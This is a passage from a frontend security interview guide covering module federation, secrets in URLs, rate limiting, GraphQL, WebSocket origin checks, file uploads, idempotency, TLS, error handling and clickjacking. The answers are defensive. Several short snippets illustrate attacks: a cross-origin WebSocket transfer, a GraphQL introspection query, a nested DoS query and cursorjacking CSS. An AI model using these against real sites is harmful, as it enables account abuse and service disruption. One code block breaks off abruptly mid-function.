  • Inconsistent security postures across teams — if one team's pipeline lacks the dependency scanning/CSP discipline others have, the whole composed app inherits that team's weakest link.

Mitigations specific to this architecture

  • Apply SRI or an equivalent integrity check to remote module loading where the tooling supports it, so a compromised remote host can't silently substitute different code.
  • Establish a shared minimum security bar across all federated teams (dependency scanning, CSP compliance, review requirements) rather than letting each team's pipeline be independently ungoverned.
  • Pin exact remote versions/URLs rather than always resolving "whatever is currently deployed at this shared endpoint," so a bad deploy from one team doesn't instantly propagate to every consuming shell without a deliberate version bump.
  • Treat each federated remote in your CSP and dependency inventory the same way you'd treat any other third-party script origin — because architecturally, it functions like one.

Code Example

// Module federation config -- the "remote" is fetched and executed at
// runtime with the SAME privileges as the shell app's own code.
// webpack.config.js (shell app):
new ModuleFederationPlugin({
  name: "shell",
  remotes: {
    checkout: "checkout@https://checkout-team.example.com/remoteEntry.js",
    // ^ this URL is a live, runtime-resolved supply-chain input --
    //   whoever controls it controls code running with full page privilege.
  },
});

// Pin an explicit, reviewed version/deployment rather than "always latest":
remotes: {
  checkout: "checkout@https://checkout-team.example.com/v2.3.1/remoteEntry.js",
}

// Treat the remote's origin like any other third-party script origin in CSP:
Content-Security-Policy: script-src 'self' https://checkout-team.example.com

Project Example

A retail platform composed five independently-deployed micro-frontends into one shell application via module federation. One contributing team's remote had noticeably laxer dependency-scanning practices than the others; when a vulnerable transitive dependency was flagged in that team's bundle, the security team realized the vulnerability effectively applied to the entire composed application (full page privilege once loaded), not just that team's visual section — prompting the org to establish a shared minimum security bar (mandatory dependency scanning, CSP compliance checks) enforced before any remote could be registered with the shell, rather than trusting each team's independent judgment.

Senior Engineer Perspective

This is a forward-looking architecture question that rewards candidates who've actually worked in or reasoned carefully about micro-frontend setups. The core insight to state clearly: independent deployment does not imply independent runtime security boundaries — once composed in one page, every federated piece shares full privilege, so the security posture of the whole system is only as strong as its weakest contributing team's pipeline. Proposing a shared minimum bar and remote-integrity verification shows you'd actually operationalize that insight rather than just naming it.

Q57. Why is putting sensitive data in a URL (query strings) a bigger problem than putting it in a request body?

ROI: ★★★★★ Frequency: High

Short Answer

A URL is logged, cached, and propagated far more widely than a request body ever is: browser history, server/proxy/CDN/load-balancer access logs, the Referer header sent to third-party resources the page subsequently loads, analytics tools that record "page URL," and bookmarks/shared links all capture the full URL including its query string. A POST body, by contrast, isn't recorded by any of those default mechanisms. Putting a token, password, or PII in a query parameter means it persists in places you don't control and often can't purge, long after the request itself completes.

Detailed Answer

Where a URL ends up that a body never does

  • Browser history — persists locally indefinitely, readable by anything with local access or sync.
  • Server/proxy/CDN access logs — most infrastructure logs the request line (method + URL) by default; very few log request bodies by default (partly for exactly this reason).
  • Referer header — sent to any third-party resource the page loads afterward, per the Referrer-Policy in effect.
  • Analytics/RUM tools — commonly record "current page URL" verbatim as a matter of course.
  • Shared/bookmarked links — a user pasting a URL into chat/email/a ticket shares whatever was embedded in it.

The GET-vs-POST framing isn't really the point

It's not that GET is "insecure" and POST is "secure" in transit — both are equally protected by TLS in flight. The issue is exclusively about where the data ends up being recorded and replayed after the fact, which differs sharply between "encoded in the URL" and "sent in the body," independent of HTTP method.

Practical guidance

  • Never put tokens, passwords, or PII in a query string — use a header or body field.
  • Where a resource genuinely needs a URL-addressable identifier (a password-reset link, an invite link), use a short-lived, single-use, unguessable token and treat leakage of that specific link as an accepted, bounded risk rather than a durable credential.
  • Configure Referrer-Policy defensively regardless, since even non-sensitive-looking URLs can leak information you didn't intend to share with third parties.

Code Example

// LEAKY: token/PII in the query string -- ends up in logs, history, Referer.
GET /api/profile?authToken=abc123&ssn=123-45-6789

// SAFER: identifiers/tokens travel in a header, sensitive data in a body.
fetch("/api/profile", {
  method: "GET",
  headers: { Authorization: `Bearer ${authToken}` }, // never logged the same way a URL is
});

// If you MUST use a URL-addressable link (e.g. password reset), make the
// token single-use, short-lived, and unguessable -- and invalidate it the
// instant it's used, so a leaked link has a bounded, one-time blast radius.
// GET /reset-password?token=SHORT_LIVED_SINGLE_USE_RANDOM_TOKEN

Project Example

A legacy internal tool authenticated some API calls via an ?apiKey= query parameter for simplicity. A routine log-aggregation vendor onboarding gave a third party read access to years of access logs, which turned out to contain live API keys for dozens of internal services embedded directly in logged URLs. Rotating every exposed key and migrating all authentication to header-based transport eliminated the ongoing leak; the incident also prompted an audit specifically grepping historical logs for any other query-string-embedded secrets.

Senior Engineer Perspective

Interviewers use this to check whether "secrets shouldn't be in URLs" is understood as a general principle (applying to CSRF tokens, session identifiers, API keys, PII alike, as seen elsewhere in this chapter) rather than a rule memorized for one specific case. The senior framing is about persistence and propagation — a URL's lifecycle extends far past the single request in a way a body's does not, and that asymmetry, not the HTTP method itself, is the actual mechanism driving the recommendation.

Q58. How should a frontend handle API rate limiting and abuse signals gracefully and safely?

ROI: ★★★ Frequency: Medium

Short Answer

Rate limiting is enforced server-side — the frontend cannot and should not try to be the security control — but a well-built client cooperates with it: it respects 429 Too Many Requests and Retry-After responses with real backoff (not an immediate retry loop that makes the situation worse), avoids accidentally hammering an endpoint (debouncing search-as-you-type, deduplicating concurrent identical requests), and never tries to work around a rate limit by, say, rotating through multiple client-side-visible API keys, which would defeat the control's purpose entirely.

Detailed Answer

Why this belongs partly in the frontend's responsibility

A frontend that retries aggressively on failure, fires duplicate requests from multiple components, or polls too frequently can trigger rate limits for entirely legitimate users through no malicious intent — a client-side bug that behaves like a self-inflicted denial-of-service against your own users. Respecting rate-limit signals properly is as much a reliability concern as a security one.

Concrete client-side patterns

  • Exponential backoff with jitter on retryable failures (429, 503), rather than fixed-interval or immediate retries that synchronize into a retry storm across many clients.
  • Honor Retry-After when the server provides it, rather than guessing a backoff interval yourself.
  • Debounce/throttle user-triggered request bursts (search-as-you-type, autosave) at the source, rather than relying purely on the server to absorb them.
  • Request deduplication — if a component re-renders and re-fires an identical in-flight request, share the pending promise rather than issuing a second call (most data-fetching libraries like React Query/SWR do this by default).
  • Surface a clear, non-alarming UI state ("please wait a moment") rather than silently failing or spamming an error toast on every retry attempt.

What the frontend should never do

Never attempt to circumvent a rate limit by rotating between multiple credentials/keys exposed to the client, spreading requests across many endpoints to dodge per-endpoint limits, or otherwise treating the limit as an obstacle to route around — that defeats a control that exists specifically to protect backend capacity and detect abuse, and any client-side "workaround" is functionally indistinguishable from what an actual attacker would do.

Code Example

// Exponential backoff with jitter, honoring Retry-After when present.
async function fetchWithBackoff(url, opts = {}, attempt = 0) {
  const res = await fetch(url, opts);
  if (res.status === 429 && attempt < 5) {
    const retryAfter = res.headers.get("Retry-After");
    const baseDelay = retryAfter ? Number(retryAfter) * 1000 : 2 ** attempt * 500;
    const jitter = Math.random() * 200;
    await new Promise((r) => setTimeout(r, baseDelay + jitter));
    return fetchWithBackoff(url, opts, attempt + 1);
  }
  return res;
}

// Debounce a search-as-you-type call at the source, not just hope the
// server's rate limiter absorbs every keystroke's request:
function useDebouncedSearch(query, delay = 300) {
  const [debounced, setDebounced] = useState(query);
  useEffect(() => {
    const t = setTimeout(() => setDebounced(query), delay);
    return () => clearTimeout(t);
  }, [query, delay]);
  return debounced;
}

Project Example

A dashboard's "live status" widget polled an endpoint every second with no backoff, and when the backend briefly slowed down and started returning 429s under load, every open dashboard tab immediately retried at the same one-second interval — amplifying rather than relieving the load, and extending the outage. Adding exponential backoff with jitter, plus honoring the server's Retry-After header, meant the next similar incident self-resolved as backend capacity recovered instead of the retry storm actively prolonging it.

Senior Engineer Perspective

The senior point: rate limiting is a backend control, but a poorly-behaved frontend can turn a minor backend hiccup into a client-amplified outage, so "cooperate gracefully with 429s" is a real frontend engineering responsibility, not solely a backend concern. Also worth naming explicitly: any attempt to route around a rate limit from the client side is a red flag in a code review, structurally identical to abuse regardless of the (usually well-intentioned) reason behind it.

Q59. What GraphQL-specific security concerns should a frontend team be aware of?

ROI: ★★★★ Frequency: Medium

Short Answer

GraphQL's flexibility is also its risk surface: introspection can expose your entire schema (including fields/types never meant for public consumption) to anyone who queries it; deeply nested or aliased queries can be used for denial-of-service (a small query text triggering an enormous amount of backend work); and batching (sending many queries/mutations in one request) can be abused to bypass per-request rate limiting or brute-force something (like a login mutation) far faster than a REST equivalent would allow. Most of the actual mitigation is backend work, but the frontend team should understand these risks well enough to flag them in a review and avoid client patterns that make them worse.

Detailed Answer

Introspection exposure

GraphQL's introspection query lets any client ask the schema to describe itself — field names, types, deprecated-but-still-present fields, internal-sounding mutations. Leaving introspection enabled in production hands an attacker a complete map of your API's surface, including anything accidentally left exposed that was never intended for the public schema. Many teams disable introspection in production while keeping it enabled in development/staging tooling.

Query complexity / depth-based denial-of-service

A GraphQL query can request deeply nested relationships (user { posts { comments { author { posts { ... } } } } }) that fan out into an enormous number of backend resolver calls from a tiny request payload — a classic asymmetric DoS vector unique to graph-shaped query languages. Backends mitigate this with query complexity/depth limits, but frontend developers should be aware that a seemingly innocent nested query they write can be the exact shape an attacker would craft maliciously, and avoid normalizing unnecessarily deep queries even for legitimate features.

Batching abuse

If the API allows batched operations in a single HTTP request, an attacker can pack many attempts (e.g. login/password-guess mutations) into one request, potentially sidestepping a naive per-HTTP-request rate limiter that counts requests rather than operations. This is a backend rate-limiting design issue, but frontend teams building against a GraphQL API should understand why "just rate-limit per request" isn't sufficient there.

Verbose errors leaking schema/internals

Default GraphQL error responses can be quite detailed (stack traces, resolver names, internal field hints) in non-hardened setups — the frontend should never surface raw GraphQL error payloads directly to end users, and the backend should ensure production error responses are sanitized.

Code Example

// Introspection query -- if enabled in production, hands over the whole schema:
query {
  __schema {
    types { name fields { name type { name } } }
  }
}

// A deeply nested query that fans out expensively on the backend from a
// small request -- the kind of shape to avoid even for legitimate features,
// and exactly what a DoS attempt would look like:
query {
  user(id: "1") {
    posts { comments { author { posts { comments { author { posts { id } } } } } } }
  }
}

// Frontend responsibility: never render raw GraphQL error payloads to users --
// they can carry internal resolver/schema details.
if (result.errors) {
  showGenericErrorToUser();       // not: showToUser(result.errors[0].message)
  logDetailedErrorInternally(result.errors);
}

Project Example

A security assessment found a production GraphQL endpoint with introspection fully enabled, exposing several internal-only mutations (originally added for an admin tool, never meant to be schema-public) that had no additional authorization check beyond "is this field callable at all." Disabling introspection in production and adding field-level authorization checks independent of schema visibility closed both the information-disclosure issue and the underlying assumption ("if it's not documented, no one will find it") that had let the authorization gap go unnoticed.

Senior Engineer Perspective

Interviewers ask this to see whether a candidate's security thinking extends past REST-shaped assumptions. The senior answer names introspection exposure, query-complexity DoS, and batching-based rate-limit bypass as GraphQL-specific risk shapes with no direct REST analog, and is careful to note that authorization must be enforced at the field/resolver level regardless of schema visibility — "it's not in the public schema" is not a security control, just an information-disclosure reduction.

Q60. What security checks matter for a WebSocket connection that a REST/HTTP mental model might miss?

ROI: ★★★★ Frequency: Medium

Short Answer

WebSockets don't participate in Same-Origin Policy or CORS the way fetch/XHR do — the initial handshake is an HTTP request that does carry cookies automatically (ambient authority, just like a form POST), but the browser does not block a cross-origin page from opening a WebSocket connection to your server the way CORS would block a cross-origin fetch. This means a WebSocket endpoint that trusts "the connection came from our page" purely based on the browser having sent it is exposed to a CSRF-like attack unless the server explicitly validates the Origin header on the handshake and doesn't rely on cookie presence alone as proof of legitimacy.

Detailed Answer

The cross-origin gap specific to WebSockets

A malicious page can execute new WebSocket("wss://victim-app.com/socket") and the browser will happily attempt the handshake, sending along any cookies scoped to that domain — there's no CORS-style preflight or origin-based blocking baked into the WebSocket API the way there is for cross-origin fetch. If your server-side handshake handler authenticates purely via the cookie's presence, an attacker's page can open an authenticated WebSocket connection to your server exactly as if it were your own frontend, and then send/receive messages as that user.

Server-side defenses

  • Explicitly validate the Origin header sent during the WebSocket handshake against an allow-list — this is the WebSocket equivalent of CSRF protection, and it's opt-in, not automatic.
  • Don't rely on the cookie alone as proof of legitimacy for the connection; consider requiring a short-lived, page-issued token passed during the handshake (analogous to a CSRF token) in addition to session cookie validation.
  • Apply the same authorization checks to every message received over the socket that you would to an equivalent REST endpoint — a long-lived connection doesn't mean "authenticated once, trust everything after."

Frontend-side considerations

  • Use wss:// (TLS) always — a plain ws:// connection has none of HTTPS's confidentiality/integrity guarantees and is trivially interceptable/injectable on the network.
  • Treat every message received over the socket as untrusted input requiring the same validation/escaping discipline as any other externally-sourced data before rendering it (recall DOM-XSS sources/sinks).
  • Handle reconnection/token-refresh carefully — a long-lived connection outlives a short-lived access token's validity, so the app needs a strategy for re-authenticating an open socket, not just the initial handshake.

Code Example

// Attacker's cross-origin page -- no CORS preflight blocks this the way it
// would block an equivalent cross-origin fetch; cookies ride along automatically.
const ws = new WebSocket("wss://victim-app.com/socket");
ws.onopen = () => ws.send(JSON.stringify({ type: "TRANSFER", to: "attacker", amount: 1000 }));
// If the server trusts "the handshake had a valid session cookie" alone, this succeeds.

// Server-side defense: validate Origin explicitly during the handshake --
// this is the WebSocket analog of a CSRF check, and it is NOT automatic.
wss.on("connection", (socket, req) => {
  const origin = req.headers.origin;
  if (origin !== "https://victim-app.com") {
    socket.close(1008, "origin not allowed");
    return;
  }
  // Still apply per-message authorization -- don't trust the connection blindly.
  socket.on("message", (msg) => handleAuthorizedMessage(socket.userId, msg));
});

// Frontend: always wss://, never ws://, for anything carrying real data.
const socket = new WebSocket("wss://app.example.com/socket"); // not ws://

Project Example

A real-time trading dashboard's WebSocket server authenticated connections purely by the presence of a valid session cookie during the handshake, with no Origin validation. A security review demonstrated that a page hosted on an entirely different domain could open an authenticated connection to the same socket endpoint (cookies attached automatically) and both receive live account data and send trade-execution messages as the victim — a CSRF-equivalent vulnerability that had gone unnoticed because the team's CSRF review had focused exclusively on REST endpoints. Adding strict Origin validation on the handshake, plus per-message authorization checks, closed the gap.

Senior Engineer Perspective

This question specifically tests whether a candidate's CSRF mental model generalizes beyond "forms and fetch" to any browser API that carries ambient cookie authority — WebSockets are a commonly missed case precisely because they don't fit the REST-request threat modeling most teams default to. The senior answer names the exact gap (no CORS-equivalent blocking on the handshake) and the exact fix (explicit Origin validation server-side, treated as a first-class security control, not an afterthought).

Q61. What client-side responsibilities exist for secure file uploads, beyond what the backend validates?

ROI: ★★★★ Frequency: Medium

Short Answer

The backend must always be the authoritative validator (file type by content, size limits, malware scanning) since client-side checks are trivially bypassed by anyone not using your actual UI — but the frontend still has real responsibilities: presenting accurate, non-misleading validation to legitimate users before an upload even starts (saving round trips, not security), never trusting a file's client-reported MIME type or extension for any security-relevant decision, safely previewing/rendering uploaded content without introducing an XSS vector (recall the SVG-upload risk covered earlier), and handling upload URLs/tokens (for direct-to-storage uploads) without leaking them beyond their intended single use.

Detailed Answer

Client-side validation is UX, not security

Checking a file's extension or size in the browser before upload improves the experience for legitimate users (immediate feedback instead of waiting for a server round trip) but provides zero security guarantee — anyone can bypass your JavaScript entirely and POST an arbitrary file directly to your upload endpoint. Never let a passed client-side check be treated as equivalent to server-side validation anywhere in your mental model or your code review comments.

Rendering uploaded content safely

Previewing a user's own just-selected file client-side (before upload) using URL.createObjectURL or a FileReader data URL is generally safe for the uploading user's own browser in that moment, but rendering other users' uploaded content later (avatars, attachments) needs the same untrusted-content discipline covered in the file-upload/SVG question earlier in this chapter — origin isolation, sanitization, correct content-type headers.

Direct-to-storage upload patterns

Many apps have the backend issue a short-lived, scoped pre-signed upload URL directly to cloud storage, bypassing the app server for the actual file bytes. The frontend must treat that URL as a sensitive, single-purpose credential: don't log it, don't leave it in browser history longer than necessary, and ensure it's scoped (time-limited, path-restricted) by the backend rather than broadly reusable.

A practical checklist

  • Never make an authorization or safety decision based on client-reported file.type/extension — the backend must inspect actual file content/magic bytes.
  • Set reasonable client-side size/type hints for UX, understanding they're not a security boundary.
  • Treat pre-signed upload URLs and upload tokens as sensitive, short-lived, single-use values.
  • Apply the same untrusted-content rendering discipline (origin isolation, sanitization, correct headers) to any uploaded file you later display to any user, including the uploader themselves on a later visit.

Code Example

// UX-only client-side check -- helpful feedback, NOT a security boundary.
function validateFileForUx(file) {
  if (!["image/png", "image/jpeg"].includes(file.type)) {
    return "Please choose a PNG or JPEG image."; // easily bypassed by any non-UI client
  }
  if (file.size > 5 * 1024 * 1024) {
    return "File is too large (max 5MB).";
  }
  return null;
}

// The backend independently validates actual content, regardless of what
// the client claimed or what UI checks passed:
// - inspect magic bytes / re-encode via an image library rather than trusting file.type
// - enforce size limits server-side too
// - scan for malware where applicable

// Direct-to-storage upload: treat the pre-signed URL as a sensitive,
// short-lived, single-use credential -- never log it, never reuse it.
const { uploadUrl } = await (await fetch("/api/uploads/presign", { method: "POST" })).json();
await fetch(uploadUrl, { method: "PUT", body: file }); // one-time use, time-limited server-side

Project Example

A document-sharing app relied on the browser-reported file.type to decide which files were "safe" to render inline versus force-download, trusting that check as if it were a security boundary. A user renamed a malicious HTML file with a .png extension and a crafted MIME type; because the actual server-side handler also naively trusted the client-supplied content-type header when serving the file back, it was served as renderable HTML rather than a downloaded image — reintroducing an XSS vector the team had believed was closed by the earlier file-type UI check. The fix moved content-type determination entirely server-side based on actual file inspection, independent of anything the client claimed at any stage.

Senior Engineer Perspective

The senior distinction to draw sharply: client-side file validation exists purely for user experience, and any security reasoning that leans on it (even implicitly, like a backend trusting a client-supplied content-type header because "the frontend already checked it") is a latent vulnerability. A strong answer also connects this back to the earlier SVG-upload and origin-isolation material — file upload handling isn't a one-time validation step, it's a chain from upload through storage through eventual rendering, and every link needs its own security reasoning independent of the others.

Q62. What is request replay, and how do idempotency keys protect against it on the frontend?

ROI: ★★★ Frequency: Medium

Short Answer

A replay is when the same request is executed more than once — sometimes maliciously (an attacker captures and resends a valid request), more often accidentally (a flaky network causes a client retry, or a user double-clicks "Submit Payment" before the UI disables it). For state-changing operations like payments, this can mean the action happens twice. An idempotency key — a unique identifier the client generates and attaches to a mutating request — lets the server recognize "I've already processed this exact operation" and return the original result instead of executing it again, making retries and double-submits safe regardless of their cause.

Detailed Answer

Why this is a frontend concern, not just a backend one

The frontend is usually the source of the retry/double-submit: a network-layer retry wrapper resubmitting a timed-out request that actually succeeded server-side, or a user impatiently clicking a submit button multiple times before the UI reflects the pending state. Generating and consistently reusing the same idempotency key across retries of the "same" logical operation is a client-side responsibility — the server can only deduplicate if the client sends a consistent key for what is conceptually one action.

How it works end to end

  1. The client generates a unique key (a UUID) once, at the moment the user initiates the action — not regenerated on each retry attempt.
  2. Every retry of that same logical request (network timeout retry, accidental double-click) sends the same key.
  3. The server checks whether it has already processed that key; if so, it returns the original result without re-executing the side effect (charging a card, creating a record) a second time.
  4. Keys are scoped with an expiry (they don't need to be remembered forever) and typically per-user, so one user's key can't collide with or be guessed to interfere with another's.

Where this matters most

Anywhere a duplicate execution has real-world consequences: payments, sending a message/notification, creating a resource with side effects (provisioning, emailing), or any action a user might reasonably double-click before UI feedback catches up.

Code Example

// Generate ONE key per logical user action, reuse it across any retries.
function submitPayment(amount) {
  const idempotencyKey = crypto.randomUUID(); // generated once, at initiation
  return submitWithRetry(amount, idempotencyKey);
}

async function submitWithRetry(amount, idempotencyKey, attempt = 0) {
  try {
    const res = await fetch("/api/payments", {
      method: "POST",
      headers: { "Idempotency-Key": idempotencyKey }, // SAME key on every retry
      body: JSON.stringify({ amount }),
    });
    return res.json();
  } catch (networkError) {
    if (attempt < 3) {
      await new Promise((r) => setTimeout(r, 2 ** attempt * 300));
      return submitWithRetry(amount, idempotencyKey, attempt + 1); // same key, not a new one
    }
    throw networkError;
  }
}

// Also disable the button immediately on click, as a UX-level first defense
// against double-submit -- idempotency keys are the durable backstop, not
// a replacement for basic submit-button hygiene.

Project Example

A checkout flow occasionally double-charged customers during periods of network instability — a request would time out client-side (triggering an automatic retry) after the payment had actually already succeeded server-side, and the retry executed the charge a second time. Adding a client-generated idempotency key, held constant across retries of the same checkout attempt and enforced server-side, eliminated the double-charges entirely: the retried request now returned the original successful result instead of creating a second charge.

Senior Engineer Perspective

The senior nuance interviewers check for: the idempotency key must be generated once per logical action and preserved across retries, not regenerated each attempt — a common mistake that defeats the entire mechanism (a fresh key on each retry looks like a brand-new operation to the server). It's also worth noting this is as much a reliability/correctness pattern as a security one, but sits squarely in frontend responsibility because the frontend is usually the one deciding when and how to retry.

Q63. Beyond "use HTTPS," what TLS-adjacent details should a frontend engineer actually understand?

ROI: ★★★ Frequency: Low-Medium

Short Answer

Most TLS configuration (cipher suites, certificate management, protocol versions) is a backend/infrastructure concern, but a few TLS-adjacent behaviors directly affect frontend engineering decisions: certificate pinning is largely impractical/unsupported in ordinary browser-based web apps (unlike native mobile apps), so browsers rely on the public CA trust model rather than app-level pinning; mixed-content blocking (covered earlier) is a direct consequence of TLS's guarantees being meaningless if any sub-resource loads over plain HTTP; and HSTS preloading commits your domain to HTTPS-only at the browser level before the first request ever happens, which is powerful but hard to reverse.

Detailed Answer

Why certificate pinning doesn't really apply to web apps

Native mobile apps can bundle an expected certificate/public key and refuse to trust anything else (pinning), because the app itself is the trust anchor. A browser-based web app has no equivalent mechanism generally available to ordinary sites — the browser trusts the standard CA ecosystem, and there's no widely-supported way for your JavaScript to enforce "only trust this specific certificate" for its own origin's connection. (The historical HPKP header that attempted this for the web was deprecated and removed from browsers due to its high risk of accidentally locking sites out of their own domains.)

HSTS preload's commitment

Adding your domain to the browser-vendor-maintained HSTS preload list means browsers refuse to even attempt an HTTP connection to your domain from the very first visit, with no trust-on-first-use gap — strong protection against SSL-stripping, but removal from the preload list can take months to propagate across browsers, so it's a decision to make deliberately, not reflexively enable everywhere including staging/test domains.

What frontend engineers should still know operationally

  • Certificate expiry causes a hard, user-visible browser error (not a graceful degradation) — frontend teams should care that certificate renewal monitoring exists, even if infrastructure owns the renewal itself.
  • Local development HTTPS setups (self-signed certs) can mask real mixed-content/cookie-Secure-attribute bugs that only surface once deployed with a real certificate — testing against a properly trusted local HTTPS setup catches these earlier.
  • Service workers, several powerful Web APIs (geolocation, camera/mic, clipboard), and cross-origin isolation features all require a "secure context" (HTTPS, or localhost) — a frontend feature relying on any of these simply won't work at all over plain HTTP, which is worth knowing when debugging "why doesn't this work in this environment."

Code Example

// A feature check that will silently fail over plain HTTP -- many powerful
// APIs require a "secure context" (HTTPS or localhost) to even be available:
if ("serviceWorker" in navigator) {
  navigator.serviceWorker.register("/sw.js"); // registration itself requires HTTPS/localhost
}
if (navigator.clipboard) {
  navigator.clipboard.writeText(text); // also secure-context-gated in most browsers
}

// HSTS preload commitment -- verify eligibility carefully before submitting,
// since removal is slow to propagate across browsers once accepted:
Strict-Transport-Security: max-age=63072000; includeSubDomains; preload

// Local dev with a properly trusted cert (rather than an ad-hoc self-signed
// one browsers warn about) surfaces real Secure-cookie/mixed-content bugs
// earlier than testing purely over http://localhost would.

Project Example

A team's local development environment ran over plain HTTP for years; a feature using the Clipboard API worked fine locally but silently failed in production behind a corporate proxy that briefly served the app over HTTP during a misconfiguration. Because the failure was silent (no thrown error the team's error tracking caught, just a missing feature), it went unnoticed until a support ticket. Understanding that this class of API requires a secure context made the root cause immediately obvious once someone thought to check the protocol, rather than assuming a browser-specific Clipboard API bug.

Senior Engineer Perspective

This is less about reciting TLS internals and more about recognizing where TLS's guarantees become load-bearing for specific frontend features and debugging scenarios. A senior candidate knows the "secure context" requirement exists and affects real APIs (service workers, several sensor/permission-gated APIs, cross-origin isolation), knows certificate pinning isn't a realistic option for ordinary web apps the way it is for native apps, and treats HSTS preload as a deliberate, hard-to-reverse commitment rather than a checkbox to always tick.

Q64. How would you design a frontend's error handling so it never leaks sensitive backend/API details to users or logs?

ROI: ★★★★ Frequency: Medium

Short Answer

Two separate failure modes to guard against: showing a raw backend error (stack trace, SQL fragment, internal service name, verbose GraphQL error) directly to the end user, and logging sensitive request/response data (passwords, tokens, full PII payloads) into a third-party error-tracking tool as an unintended side effect of "just log everything for debugging." Both are solved the same way structurally: normalize/sanitize at a single boundary — a shared API-error-handling layer that maps backend errors to safe, generic user-facing messages, and a logging integration that explicitly scrubs known-sensitive fields before anything leaves the browser.

Detailed Answer

The user-facing leak

Directly rendering error.message from a caught exception or an API's raw error response is a common shortcut that can expose internal service names, database error fragments, file paths, or (as covered in the GraphQL question) resolver/schema details — information that helps an attacker map your system, and looks unprofessional/alarming to legitimate users besides. Map every error type to a small, curated set of safe, user-appropriate messages instead.

The logging/telemetry leak

Error-tracking tools (Sentry and similar) often capture request context automatically by default — headers, form data, local component state — which can inadvertently include exactly the sensitive fields you'd never want in a third-party tool's storage: passwords typed into a form that errored, auth tokens present in a captured header, full unmasked PII. This requires deliberate configuration (scrubbing rules, denylisting specific fields/headers) rather than assuming the default capture behavior is already safe.

A practical layered approach

  • Centralize API error handling in one place (an API client wrapper, a React Query/SWR error handler) rather than letting every component individually decide how to render an error — consistency here is what makes the sanitization boundary enforceable.
  • Map backend error codes to a fixed, reviewed set of user-facing messages; never interpolate raw backend error text into UI.
  • Configure error-tracking tool scrubbing rules explicitly (deny sensitive header names, redact password/token-shaped fields) rather than trusting default capture behavior.
  • Log full detail server-side (where access is controlled and audited) and only send a sanitized summary to client-side/third-party telemetry.

Code Example

// BAD: raw backend error text rendered directly to the user.
catch (err) {
  showToast(err.message); // might be "duplicate key value violates unique constraint users_email_idx"
}

// BETTER: map to a small, curated set of safe messages at one central boundary.
const ERROR_MESSAGES = {
  EMAIL_TAKEN: "That email is already registered.",
  INVALID_CREDENTIALS: "Incorrect email or password.",
  DEFAULT: "Something went wrong. Please try again.",
};
function toUserMessage(err) {
  return ERROR_MESSAGES[err.code] || ERROR_MESSAGES.DEFAULT; // never err.message directly
}

// Error-tracking tool: explicitly scrub sensitive fields BEFORE anything
// is sent, rather than trusting default request/state capture.
Sentry.init({
  beforeSend(event) {

SECTION 11 - CLICKJACKING & FRAMING PROTECTIONS

Q65. Beyond stealing a single click, what other real-world clickjacking variants exist ("likejacking," cursorjacking, drag-and-drop)?

ROI: ★★★ Frequency: Low-Medium

Short Answer

Clickjacking has several named variants beyond the classic "hidden button under bait": likejacking tricks users into unknowingly triggering a social "like"/"share" action on a framed social widget; cursorjacking uses CSS to visually offset the rendered cursor from its actual position, so a user clicking where they visually see the cursor actually clicks somewhere else entirely; and drag-and-drop ("double") clickjacking lures the victim into a multi-step drag or double-click sequence that spans both the decoy and the framed page, extracting data or triggering an action across the boundary in ways a single-click defense might not anticipate. All share the same root cause (framing your page without consent) and the same core defenses (framing headers, plus care with input/pointer handling).

Detailed Answer

Likejacking

An attacker frames a social platform's "like"/"follow" button beneath enticing decoy content; the visible click ("Play video") is actually landing on the invisible social action button in the frame beneath, causing the action to fire without the user's awareness. Platforms have hardened their share/like widgets over time, but the underlying pattern — any framed one-click social action — remains a relevant risk shape for embeddable interactive widgets generally.

Cursorjacking

Using custom cursor CSS/images and clever positioning, an attacker's page can make the cursor appear to be in one place while the browser's actual click coordinate lands elsewhere — subtly offsetting the user's intended click target without them noticing the discrepancy, since the visual feedback matches their expectation right up until the click lands somewhere unintended.

Drag-and-drop / multi-step interactions

Some frame-based attacks require more than a single click — luring a user through a drag operation or a sequence of two clicks (sometimes called "double clickjacking") that starts on the decoy page and ends inside the framed target, exploiting the fact that some frame-protection assumptions focus narrowly on a single click event rather than multi-step pointer interactions spanning the frame boundary.

Why the same defenses still cover most of this

frame-ancestors/X-Frame-Options preventing framing at all remains the root fix for every variant above, since all of them require your page to be framed in the first place. Where framing is a legitimate requirement (an embeddable widget), additional care with pointer-event handling (not assuming a single "click" is atomic/trustworthy for the most sensitive actions) and requiring explicit, unambiguous confirmation for high-value actions (not achievable via a single click or drag alone) adds defense in depth.

Code Example

// Cursorjacking-style CSS trick: the rendered "cursor" image is offset from
// the browser's actual pointer position, misleading the user about where
// their click will actually land.
<style>
  body { cursor: none; } /* hide the real cursor */
  .fake-cursor {
    position: absolute; pointer-events: none;
    /* JS positions this at (real_x - 40, real_y - 40), say, so the visible
       "cursor" appears offset from where a click will actually register */
  }
</style>

// The root defense for ALL variants above -- prevent framing entirely
// unless explicitly required, same as classic clickjacking:
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'

// For a legitimately embeddable widget, require an unambiguous, deliberate
// confirmation step for high-value actions rather than trusting a bare
// click/drag event as sufficient proof of informed user intent:
// e.g. a re-typed confirmation, not just "click to confirm."

Project Example

A social-sharing widget embedded across many partner sites was found, during a security assessment, to be vulnerable to a likejacking-style attack when framed inside a page with an overlaid decoy — clicking a "claim reward" button on the host page silently also triggered the widget's "share" action underneath. The vendor added frame-busting logic tuned specifically for their known legitimate embed use cases (allow-listing partner origins via frame-ancestors) while still supporting the intended embedding, closing the specific likejacking vector without breaking the product's core embeddability.

Senior Engineer Perspective

The senior point here isn't that each named variant needs a bespoke defense — it's recognizing that they're all downstream of the same root cause (unwanted framing), so a security review shouldn't stop at "we set X-Frame-Options" and consider clickjacking fully handled. A strong candidate can name that framing headers are the load-bearing fix, and that anything requiring a legitimately embeddable, high-value interactive widget deserves extra scrutiny on its pointer-event assumptions specifically, since that's where these more exotic variants live.

Q66. How do you design a legitimately embeddable widget (one that must be framed by partner sites) without exposing it to clickjacking?

ROI: ★★★★ Frequency: Medium

Short Answer

You can't use frame-ancestors 'none' if being framed is the whole point, so the defense shifts from "block all framing" to "allow only known partners, and require unambiguous user intent for anything sensitive." Concretely: allow-list specific partner origins via frame-ancestors rather than leaving framing wide open, require deliberate, hard-to-forge confirmation for high-value actions (not satisfiable by a single click that could plausibly be clickjacked), and consider visual/behavioral signals (a visible, non-transparent required interaction) that a hidden overlay attack would disrupt.

Detailed Answer

Allow-list, don't open the floodgates

"We need to support embedding" is not the same as "anyone should be able to frame us" — enumerate the actual partner domains that need to embed your widget and restrict frame-ancestors to exactly those, updating it deliberately as new partners onboard rather than defaulting to unrestricted framing for convenience.

Design the interaction to resist single-click hijacking

